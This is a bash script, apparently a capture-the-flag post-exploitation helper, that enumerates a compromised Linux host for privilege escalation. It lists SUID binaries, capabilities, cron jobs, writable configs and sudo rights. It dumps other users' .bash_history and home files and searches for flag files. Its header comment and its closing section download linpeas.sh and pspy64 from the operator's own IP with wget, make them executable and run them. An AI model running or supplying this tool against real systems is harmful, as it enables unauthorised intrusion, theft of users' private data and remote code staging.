#!/bin/bash

# wget <my_ip>:8000/minlinum.sh; chmod +x minlinum.sh; ./minlinum.sh

# https://stackoverflow.com/questions/5947742/how-to-change-the-output-color-of-echo-in-linux
# Black        0;30     Dark Gray     1;30
# Red          0;31     Light Red     1;31
# Green        0;32     Light Green   1;32
# Brown/Orange 0;33     Yellow        1;33
# Blue         0;34     Light Blue    1;34
# Purple       0;35     Light Purple  1;35
# Cyan         0;36     Light Cyan    1;36
# Light Gray   0;37     White         1;37

# RED='\033[0;31m'
# NC='\033[0m' # No Color

# echo -e "I ${RED}love${NC} Stack Overflow"

# https://stackoverflow.com/questions/4414297/unix-bash-script-to-embolden-underline-italicize-specific-text

# underline=`tput smul`
# nounderline=`tput rmul`

# ======================================================

# https://stackoverflow.com/questions/2924697/how-does-one-output-bold-text-in-bash
# bold=$(tput bold)
# normal=$(tput sgr0)

# echo "this is ${bold}bold${normal} but this isn't"

# ======================================================

NC='\033[0m' # No Color
RED='\033[0;31m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLACK='\033[0;30m'

bold=$(tput bold)
normal=$(tput sgr0)
underline=`tput smul`
nounderline=`tput rmul`

read -p 'Please enter your ip: ' my_ip

read -p 'Please enter your server`s port: ' my_port

echo -e "${PURPLE}${bold}Let's try looking for priv esc:\n\n"

echo -e "${RED}Looking for my id:${NC}\n\n"
id

echo -e "\n${RED}sudo -l:${NC}\n\n"
read -p "Do you have the password? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then # this grammar (the #[] operator) means that the variable $answer where any Y or y in 1st position will be dropped if they exist.
    sudo -l
else
    echo "I see, let's move on..."
fi

echo -e "\n${RED} Looking inside important files:${NC}\n\n"

read -p "Do you want to see all writable files for the current user? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    find /etc -writable 2>/dev/null
else
    echo "I see, let's move on..."
fi

read -p "Do you want to see what is accessable inside your group? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    find / -group $gid 2> /dev/null
else
    echo "I see, let's move on..."
fi

echo -e "${BLUE}ls -la /var/backups:${NC}"
ls -la /var/backups

echo -e "${BLUE}ls -aR /home:${NC}"
ls -la /home
read -p "After looking at the home directory, do you want to look into folders inside it? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    read -r -p "Please enter folder's names separated by space: " -a arr
	for folder in "${arr[@]}"; do 
	   echo -e "${YELLOW}${bold}$folder folder:${normal}"
	   ls -alR /home/$folder
	   echo -e "${GREEN}cat /home/$folder/$FILE:${NC}"
	   echo ${underline}.bash_history${nounderline}:
	   cat /home/$folder/.bash_history
	   for FILE in /home/$folder/*
	   do
	   	echo ${underline}$FILE${nounderline}:
	   	cat $FILE
	   done
	done
else
    echo "Nothing interesting ha? let's move on..."
fi


read -p "Do you want to look for the configurations? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    echo -e "\n${BLUE}Looking for configuration files:${normal}"
	find / -type f -iname 'config.php*' 2>/dev/null
	find / -type f -iname '.conf*' 2>/dev/null
else
    echo "No configurations looking this time? let's move on..."
fi

read -p "Do you want to search for extensions like .sh, .php, .py etc? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    read -r -p "Enter their names (without the dot) with spaces between: " -a arr
	for ext in "${arr[@]}"; do 
	   echo -e "${YELLOW}${bold}/usr/bin*.$ext stuff:${normal}"
	   ls -la /usr/bin/ | grep ".$ext$"
	done
else
    echo "No extensions are interesting for you? let's move on..."
fi


echo -e "\n${RED} Looking for classic priv esc:${NC}\n\n"

echo -e "${BLUE} searching for SUID:${NC}"
find / -type f -perm -04000 -ls 2>/dev/null

echo -e "${BLUE} Capabilities:${NC}"
getcap -r / 2>/dev/null

echo -e "${BLUE} crontab:${NC}"
cat /etc/crontab

read -p "Want to look into more directories of cron tasks? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    ls -l /var/spool/cron
    echo -e "You can also try to use: systemctl list-timers"
else
    echo "I see, let's move on..."
fi

echo -e "${BLUE} Docker maybe:${NC}"
netstat -tplan

echo -e "${BLUE} uname -a:${NC}"
uname -a

echo -e "\n${RED} Looking for flags:${NC}\n\n"

echo -e "${BLUE} find / -type f -iname '*flag*' 2>/dev/null:${NC}"
find / -type f -iname '*flag.txt*' 2>/dev/null

echo -e "${BLUE} find / -type f -iname '*user*' 2>/dev/null:${NC}"
find / -type f -iname '*user.txt*' 2>/dev/null

echo -e "${BLUE} find / -type f -iname '*root*' 2>/dev/null:${NC}"
find / -type f -iname '*root.txt*' 2>/dev/null

echo -e "\n${RED} Looking for files owned by user or group:${NC}\n\n"

echo -e "${BLUE}Your uid and gid are:${NC}\n\n"
id

uid=$(id -u)
gid=$(id -g)

read -p "Do you want to see what your user owns? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    echo -e "\n${BLUE} Your $uid owns: ${NC}"
	find / -user $uid 2> /dev/null
else
    echo "Not interested with what you owns? let's move on..."
fi

read -p "Do you want to see what your group owns? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    echo -e "\n${BLUE} Your $gid owns: ${NC}"
	find / -group $gid 2> /dev/null
else
    echo "Not interested with what your group owns? let's move on..."
fi

echo -e "\n${RED} Looking for git stuff:${NC}\n\n"

cd /
git log -p

echo -e "\n${RED} linpeas.sh\npspy64${NC}\n\n"
cd /tmp
if ! test -f "linpeas.sh"; then
	echo "You haven't downloaded linpeas.sh ! I will do it for you :)"
    wget $my_ip:$my_port/linpeas.sh
	chmod +x linpeas.sh
fi
if ! test -f "pspy64"; then
	echo "You haven't downloaded pspy64 ! I will do it for you :)"
    wget $my_ip:$my_port/pspy64
	chmod +x pspy64
fi

read -p "Do you want to run linpeas.sh | tee linpeas.log? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    ./linpeas.sh | tee linpeas.log
else
    echo "No linpeas.sh this time..."
fi

read -p "Do you want to run pspy64? y/n " answer
if [ "$answer" != "${answer#[Yy]}" ] ;then
    ./pspy64
else
    echo "no pspy64 this time..."
fi